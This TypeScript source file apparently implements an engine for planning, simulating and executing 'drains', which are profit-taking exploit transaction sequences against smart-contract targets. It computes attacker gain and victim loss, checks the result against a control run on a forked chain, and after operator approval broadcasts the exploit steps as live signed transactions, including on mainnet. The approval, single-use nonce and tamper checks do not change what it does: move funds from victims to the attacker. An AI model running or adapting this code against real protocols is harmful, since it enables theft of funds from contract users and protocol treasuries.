  const attackIdx = steps.filter((s) => s.exploit).map((s) => s.index);
  if (attackIdx.length === 0) {
    return refusal(
      'no_control_run',
      'no leg is marked exploit; with nothing to remove there is no control run and no attributable extraction',
    );
  }

  // ── 5. accounting ────────────────────────────────────────────────────────
  //
  // Three distinct quantities, deliberately not conflated:
  //
  //   capital_in  what the attacker must HOLD to run the plan (native value
  //               sent + any balance the legs assume). A leg that only borrows
  //               (flashloan) declares neither: borrowed capital is not the
  //               attacker's, and pretending otherwise would let a plan hide a
  //               pre-funded balance behind an "it was a loan" note.
  //   gross_out   the sum of the positive per-leg deltas.
  //   net         the sum of ALL per-leg deltas — the plan's actual profit.
  //               Legs that cost value already carry a negative delta, so the
  //               cost is inside `net`; subtracting capital_in again here would
  //               double-count it and make an honest plan look unprofitable.
  const net = grossOut - grossCost;
  const declared = input.declared_capital_in_wei ?? capitalIn;
  if (!isBig(declared)) {
    return refusal('plan_invalid', 'declared_capital_in_wei must be a bigint (wei)');
  }
  if (declared !== capitalIn) {
    return refusal(
      'capital_unaccounted',
      `the plan declares ${declared} wei of capital in but its legs require ${capitalIn} wei; ` +
        'an extraction may not lean on a balance it does not account for',
    );
  }
  if (capitalIn > grossOut) {
    return refusal(
      'capital_exceeds_extraction',
      `capital in (${capitalIn} wei) exceeds capital out (${grossOut} wei); this is not an extraction`,
    );
  }
  if (net <= 0n) {
    return refusal(
      'no_positive_delta',
      `net delta is ${net} wei; a drain that nets nothing (or less) is not a drain`,
    );
  }

  // ── 6. build the body, then bind the approval to it ──────────────────────
  const body: FingerprintBody = {
    class: cls as DrainClass,
    vector: vectorId,
    target,
    chain_id: chainId,
    asset,
    steps,
    attack_step_indexes: attackIdx,
    fork_block: forkBlock,
    proof_test_name: poc.test_name,
    proof_control_name: poc.control_name,
    proof_claim: proof.claim,
    gross_out_wei: grossOut,
    capital_in_wei: capitalIn,
    net_wei: net,
  };
  const fingerprint = sha256Hex(canonicalBody(body));

  const draft: DrainPlan = {
    drain_id: `drain_${fingerprint.slice(0, 16)}`,
    fingerprint,
    class: body.class,
    vector: body.vector,
    target: body.target,
    chain_id: body.chain_id,
    asset: body.asset,
    steps: body.steps,
    attack_step_indexes: body.attack_step_indexes,
    control_removed_step_indexes: body.attack_step_indexes.slice(),
    fork_block: body.fork_block,
    proof_test_name: body.proof_test_name,
    proof_control_name: body.proof_control_name,
    proof_claim: body.proof_claim,
    gross_out_wei: body.gross_out_wei,
    capital_in_wei: body.capital_in_wei,
    net_wei: body.net_wei,
    declared_capital_in_wei: declared,
  };

  // The fingerprint must round-trip on the plan we just built. If it does not,
  // the canonicaliser and the plan disagree and nothing downstream is safe.
  if (planFingerprint(draft) !== fingerprint) {
    return refusal('plan_invalid', 'internal: plan fingerprint does not round-trip; refusing to emit the plan');
  }

  return draft;
}

/**
 * Build the reviewable plan, and require a valid approval for it.
 *
 * PURE: no I/O, no mutation of the input, no clock read (the clock is supplied).
 * The ledger is only queried. Calling this twice with the same input yields the
 * same plan and does NOT consume the approval — consumption is executeDrain's
 * job, so an operator can re-read a plan as many times as they like.
 *
 * This is the only entry point that yields a plan carrying an approval, and it
 * is the one `executeDrain` uses. There is deliberately no overload that skips
 * the approval, no `assume_approved` flag, and no default argument that could
 * supply one.
 */
export function planDrain(input: DrainInput): DrainPlan | DrainRefusal {
  const draft = draftDrain(input);
  if (isRefusal(draft)) return draft;

  const now = input.now ?? Math.floor(Date.now() / 1000);
  const approvalProblem = checkApproval(draft, input.approval, input.ledger, now, input.confirm_mainnet === true);
  if (approvalProblem) return approvalProblem;

  return draft;
}

// ── rendering (for the operator's review) ────────────────────────────────────

/**
 * What the operator reads before approving. If a human cannot check the plan
 * from this text, the approval is theatre — so every step, its calldata, its
 * capital and its expected delta is printed.
 */
export function renderPlan(plan: DrainPlan): string {
  const lines: string[] = [];
  lines.push(`DRAIN ${plan.drain_id}`);
  lines.push(`  fingerprint  ${plan.fingerprint}`);
  lines.push(`  class        ${plan.class}  (${DRAIN_CLASSES[plan.class].authority})`);
  lines.push(`  vector       ${plan.vector} — ${EXTRACTION_VECTORS[plan.vector].note}`);
  lines.push(`  target       ${plan.target} on chain ${plan.chain_id}`);
  lines.push(`  asset        ${plan.asset}`);
  lines.push(`  fork block   ${plan.fork_block}`);
  lines.push(`  proven by    ${plan.proof_test_name}  (control: ${plan.proof_control_name})`);
  lines.push(`  claim        ${plan.proof_claim}`);
  lines.push('  steps:');
  for (const s of plan.steps) {
    const tag = s.exploit ? 'EXPLOIT' : '       ';
    lines.push(
      `    [${s.index}] ${tag} ${s.kind.padEnd(7)} -> ${s.to}  value ${formatWei(s.value_wei)}  ` +
        `prefunded ${formatWei(s.prefunded_wei)}  delta ${formatWei(s.expected_delta_wei)}`,
    );
    lines.push(`             data ${s.data.length > 74 ? `${s.data.slice(0, 74)}…` : s.data}`);
    if (s.note) lines.push(`             note ${s.note}`);
  }
  lines.push(`  control      same plan with steps ${plan.control_removed_step_indexes.join(', ')} removed`);
  lines.push(`  gross out    ${formatWei(plan.gross_out_wei)} (${plan.gross_out_wei} wei)`);
  lines.push(`  capital in   ${formatWei(plan.capital_in_wei)} (${plan.capital_in_wei} wei)`);
  lines.push(`  net          ${formatWei(plan.net_wei)} (${plan.net_wei} wei)`);
  return lines.join('\n');
}

// ── execution ────────────────────────────────────────────────────────────────

/** Outcome of running the plan's steps once, on a fork or a chain. */
export interface DrainRunOutcome {
  ok: boolean;
  /** measured attacker balance change, wei (signed) */
  attacker_delta_wei: bigint;
  /** measured victim/protocol balance change, wei (signed, negative = loss) */
  victim_delta_wei: bigint;
  tx_hashes: string[];
  reason: string | null;
}

export interface DrainSimRequest {
  plan: DrainPlan;
  /** true => omit plan.control_removed_step_indexes. Nothing else may differ. */
  control: boolean;
  fork_block: number;
}

/**
 * The injected execution boundary. In production this drives `forge test` with
 * `--fork-url` / vm.createSelectFork; in tests it is a fake. This module never
 * talks to a node itself, which is why the whole suite is network-free.
 */
export interface DrainExec {
  run(req: DrainSimRequest): Promise<DrainRunOutcome>;
}

export type DrainStatus =
  | 'refused'
  | 'void'
  | 'simulated_ok'
  | 'broadcast_ok'
  | 'broadcast_partial'
  | 'broadcast_failed';

/** The prescribed receipt shape, plus the fields needed to audit it. */
export interface DrainReceipt {
  broadcast: boolean;
  attacker_delta: bigint;
  victim_loss: bigint;
  control_delta: bigint;
  tx_hashes: string[];
  status: DrainStatus;
  refusal?: { code: DrainRefusalCode; reason: string };
  drain_id?: string;
  fingerprint?: string;
  chain_id?: number;
  net_wei?: bigint;
  sim_tx_hashes?: string[];
  relay_codes?: string[];
  consumed?: boolean;
}

export interface ExecuteInput extends DrainInput {
  /** fork/chain runner. Absent => refuse (we will not invent one). */
  exec?: DrainExec | null;
  /** live-write relay from send.ts. Created per drain when absent. */
  relay?: SendRelay | null;
  signer?: Signer | null;
  rpc?: ChainRpc | null;
  /** env reference bag, forwarded verbatim to the relay (it only sniffs key presence) */
  env?: Record<string, string | undefined>;
  /** you must pass exactly `false` to broadcast. anything else is a simulation. */
  dry_run?: boolean;
  /** injected clock, so expiry can be re-checked mid-flight */
  clock?: () => number;
  /**
   * The exact plan object the operator reviewed and approved.
   *
   * Optional, and never trusted: when supplied it must (a) still hash to its own
   * `fingerprint` and (b) carry the same fingerprint as the plan the approval
   * names. Anything else is refused before any work is done. This exists so a
   * caller cannot approve one object and execute a differently-constructed one,
   * and it is what makes the `plan_signature_mismatch` rung reachable in
   * production rather than only in principle.
   */
  approved_plan?: DrainPlan | null;
}

const receipt = (
  status: DrainStatus,
  r: DrainRefusal,
  extra: Partial<DrainReceipt> = {},
): DrainReceipt => ({
  broadcast: false,
  attacker_delta: 0n,
  victim_loss: 0n,
  control_delta: 0n,
  tx_hashes: [],
  status,
  refusal: { code: r.code, reason: r.reason },
  ...extra,
});

/**
 * Run the plan.
 *
 * Order, and why:
 *   1. re-derive + re-check the plan (a plan edited after approval is refused)
 *   2. claim the nonce — single use is decided here, before any work is done
 *   3. simulate the ATTACK on a fork
 *   4. simulate the CONTROL on a fork; a non-zero control delta voids the run
 *   5. account for both sides: attacker gain must have a victim loss
 *   6. re-check the approval ladder immediately before the wire (revoke/expire)
 *   7. broadcast only if dry_run === false, and only through SendRelay
 *
 * Every early return happens BEFORE step 7, so nothing is signed on a refusal.
 */
export async function executeDrain(input: ExecuteInput): Promise<DrainReceipt> {
  const clock = input.clock ?? (() => input.now ?? Math.floor(Date.now() / 1000));

  // ── 1. plan (this is the full ladder, including the approval checks) ──────
  const planned = planDrain({ ...input, now: clock() });
  if (isRefusal(planned)) return receipt('refused', planned);

  // The derived plan must hash to its own fingerprint.
  if (!planSignatureValid(planned)) {
    return receipt(
      'refused',
      refusal(
        'plan_signature_mismatch',
        'the derived plan body does not hash to its fingerprint; refusing to execute it',
      ),
      { drain_id: planned.drain_id },
    );
  }

  // If the caller supplies the plan object the operator reviewed, execute THAT —
  // but only after proving it is intact and is the same plan the approval names.
  // Otherwise settle for the plan derived from the legs, which is the same thing
  // by construction.
  let chosen: DrainPlan = planned;
  if (input.approved_plan) {
    const ap = input.approved_plan;
    // (a) tampering: the object no longer matches its own fingerprint.
    if (!planSignatureValid(ap)) {
      return receipt(
        'refused',
        refusal(
          'plan_signature_mismatch',
          'the plan supplied as approved no longer hashes to its own fingerprint; it was modified after review',
        ),
        { drain_id: typeof ap.drain_id === 'string' ? ap.drain_id : undefined },
      );
    }
    // (b) substitution: intact, but not the plan the approval authorises.
    if (ap.fingerprint !== planned.fingerprint) {
      return receipt(
        'refused',
        refusal(
          'approval_plan_mismatch',
          `the supplied plan is ${ap.fingerprint.slice(0, 16)}… but the approval names ` +
            `${planned.fingerprint.slice(0, 16)}…; approving one plan never authorises another`,
        ),
        { drain_id: ap.drain_id, fingerprint: ap.fingerprint },
      );
    }
    chosen = ap;
  }

  // Freeze the plan for the duration of execution.
  //
  // Nothing outside this call holds the derived plan yet, and an externally
  // supplied one has just been fingerprint-verified, so from here the object the
  // executor receives IS the object that gets signed.
  const plan = deepFreezePlan(chosen);

  // Re-verify, then keep verifying immediately before the wire.
  if (!planSignatureValid(plan)) {
    return receipt(
      'refused',
      refusal(
        'plan_signature_mismatch',
        'the plan body no longer hashes to plan.fingerprint; it was modified after approval',
      ),
      { drain_id: plan.drain_id },
    );
  }

  const approval = input.approval as DrainApproval;
  const ledger = input.ledger as ApprovalLedger;

  // ── 2. claim the nonce: single use, decided before any work ───────────────
  const claimed = ledger.consume(approval.nonce, plan.fingerprint, approval.operator, clock());
  if (!claimed) {
    return receipt(
      'refused',
      refusal(
        'approval_consumed',
        'this approval has already been consumed (or revoked); a second drain needs a new approval',
      ),
      { drain_id: plan.drain_id, fingerprint: plan.fingerprint },
    );
  }

  // ── 3. the runner ────────────────────────────────────────────────────────
  const exec = input.exec;
  if (!exec || typeof exec.run !== 'function') {
    return receipt(
      'refused',
      refusal('no_exec', 'no DrainExec supplied; refusing to claim an extraction that was never run'),
      { drain_id: plan.drain_id, fingerprint: plan.fingerprint, consumed: true },
    );
  }

  // ── 3/4. attack then control, on a fork ──────────────────────────────────
  let attack: DrainRunOutcome;
  try {
    attack = await exec.run({ plan, control: false, fork_block: plan.fork_block });
  } catch (e) {
    return receipt(
      'refused',
      refusal('simulation_failed', `attack simulation threw: ${msgOf(e)}`),
      { drain_id: plan.drain_id, fingerprint: plan.fingerprint, consumed: true },
    );
  }
  if (!attack || attack.ok !== true) {
    return receipt(
      'refused',
      refusal(
        'simulation_failed',
        `attack simulation did not succeed: ${attack?.reason ?? 'no reason given'}`,
      ),
      { drain_id: plan.drain_id, fingerprint: plan.fingerprint, consumed: true },
    );
  }

  let control: DrainRunOutcome;
  try {
    control = await exec.run({ plan, control: true, fork_block: plan.fork_block });
  } catch (e) {
    return receipt(
      'refused',
      refusal('control_failed', `control simulation threw: ${msgOf(e)}`),
      {
        drain_id: plan.drain_id,
        fingerprint: plan.fingerprint,
        consumed: true,
        attacker_delta: attack.attacker_delta_wei,
      },
    );
  }
  if (!control || control.ok !== true) {
    return receipt(
      'refused',
      refusal('control_failed', `control run did not succeed: ${control?.reason ?? 'no reason given'}`),
      {
        drain_id: plan.drain_id,
        fingerprint: plan.fingerprint,
        consumed: true,
        attacker_delta: attack.attacker_delta_wei,
      },
    );
  }

  // A control that moves value is a broken fixture. The extraction is then
  // indistinguishable from normal flow, so the result is VOID — not partial.
  if (control.attacker_delta_wei !== 0n || control.victim_delta_wei !== 0n) {
    return receipt(
      'void',
      refusal(
        'control_not_clean',
        `the control run moved value (attacker ${control.attacker_delta_wei} wei, victim ` +
          `${control.victim_delta_wei} wei); the extraction is not attributable`,
      ),
      {
        drain_id: plan.drain_id,
        fingerprint: plan.fingerprint,
        consumed: true,
        attacker_delta: attack.attacker_delta_wei,
        victim_loss: -attack.victim_delta_wei,
        control_delta: control.attacker_delta_wei,
        sim_tx_hashes: attack.tx_hashes.slice(),
      },
    );
  }

  // ── 5. both sides must be measured ───────────────────────────────────────
  const attackerDelta = attack.attacker_delta_wei;
  const victimLoss = -attack.victim_delta_wei; // positive number = the victim lost this
  const base = {
    drain_id: plan.drain_id,
    fingerprint: plan.fingerprint,
    chain_id: plan.chain_id,
    consumed: true,
    attacker_delta: attackerDelta,
    victim_loss: victimLoss,
    control_delta: control.attacker_delta_wei,
    sim_tx_hashes: attack.tx_hashes.slice(),
  };

  if (attackerDelta <= 0n) {
    return receipt(
      'refused',
      refusal(
        'no_measured_gain',
        `the extraction produced no attacker gain (${attackerDelta} wei); there is nothing to drain`,
      ),
      base,
    );
  }
  if (victimLoss <= 0n) {
    return receipt(
      'refused',
      refusal(
        'no_victim_loss',
        `the attacker gained ${attackerDelta} wei but no victim lost anything; the profit has no source, so ` +
          'this is not attributable to the target',
      ),
      base,
    );
  }

  // ── 6. pre-wire re-check: same ladder, fresh clock, fresh ledger read ────
  // Anything revoked, expired or consumed between step 1 and here stops us now.
  const recheck = checkApproval(
    { fingerprint: plan.fingerprint, gross_out_wei: plan.gross_out_wei, chain_id: plan.chain_id },
    approval,
    ledger,
    clock(),
    input.confirm_mainnet === true,
  );
  if (recheck && recheck.code !== 'approval_consumed') {
    // approval_consumed is expected here: we claimed the nonce at step 2, so the
    // ledger cannot say anything else about our own approval. Every other code
    // — revoked, expired, a ceiling that moved, a chain that changed — is a real
    // stop, and it happens before the wire.
    return receipt('refused', recheck, base);
  }
  if (!planSignatureValid(plan)) {
    return receipt(
      'refused',
      refusal('plan_signature_mismatch', 'the plan body changed between simulation and broadcast'),
      base,
    );
  }

  // ── 7. broadcast (only through the v1 relay, only on explicit dry_run:false) ─
  const broadcastWanted = input.dry_run === false;
  if (!broadcastWanted) {
    return {
      ...base,
      broadcast: false,
      tx_hashes: [],
      status: 'simulated_ok',
    };
  }

  const relay = input.relay ?? new SendRelay();
  // Built from the ALREADY VALIDATED approval. This is a translation, not a
  // minting: the values come from fields checkApproval() just accepted.
  const grant: LiveWriteGrant = {
    approved: true,
    operator: approval.operator,
    chain_id: plan.chain_id,
    max_value_wei: approval.max_value_wei,
    expires_at: approval.expires_at,
    ...(approval.allow_mainnet === true ? { allow_mainnet: true } : {}),
  };

  const hashes: string[] = [];
  const relayCodes: string[] = [];
  for (const step of plan.steps) {
    const res: SendResult = await relay.send({
      verdict: { verdict: 'proven' },
      tx: { to: step.to, data: step.data, value: step.value_wei, chain_id: plan.chain_id },
      grant,
      signer: input.signer ?? null,
      rpc: input.rpc ?? null,
      env: input.env,
      dry_run: false,
      confirm_mainnet: input.confirm_mainnet === true,
      now: clock(),
    });
    relayCodes.push(res.code);
    if (!res.ok) {
      return {
        ...base,
        broadcast: hashes.length > 0,
        tx_hashes: hashes,
        status: hashes.length > 0 ? 'broadcast_partial' : 'broadcast_failed',
        relay_codes: relayCodes,
        refusal: { code: 'relay_refused', reason: `relay refused at step ${step.index}: ${res.code} — ${res.reason}` },
      };
    }
    if (res.tx_hash) hashes.push(res.tx_hash);
  }

  return {
    ...base,
    broadcast: hashes.length > 0,
    tx_hashes: hashes,
    status: 'broadcast_ok',
    relay_codes: relayCodes,
  };
}

function msgOf(e: unknown): string {
  if (e instanceof Error) return e.message;
  if (typeof e === 'string') return e;
  try {
    return JSON.stringify(e) ?? 'unknown error';
  } catch {
    return 'unknown error';
  }
}

/** Freeze a plan and its steps so the executor cannot rewrite what it signs. */
function deepFreezePlan(p: DrainPlan): DrainPlan {
  for (const step of p.steps) Object.freeze(step);
  Object.freeze(p.steps);
  Object.freeze(p.attack_step_indexes);
  Object.freeze(p.control_removed_step_indexes);
  return Object.freeze(p);
}

/** One-line receipt for a log or a Telegram message. */
export function renderReceipt(r: DrainReceipt): string {
  const head = `${r.status.toUpperCase()} drain=${r.drain_id ?? '?'} broadcast=${r.broadcast}`;
  const body =
    `attacker +${formatWei(r.attacker_delta)} / victim -${formatWei(r.victim_loss)} / ` +
    `control ${formatWei(r.control_delta)} / txs ${r.tx_hashes.length}`;
  return r.refusal ? `${head} :: ${body} :: ${r.refusal.code}: ${r.refusal.reason}` : `${head} :: ${body}`;
}
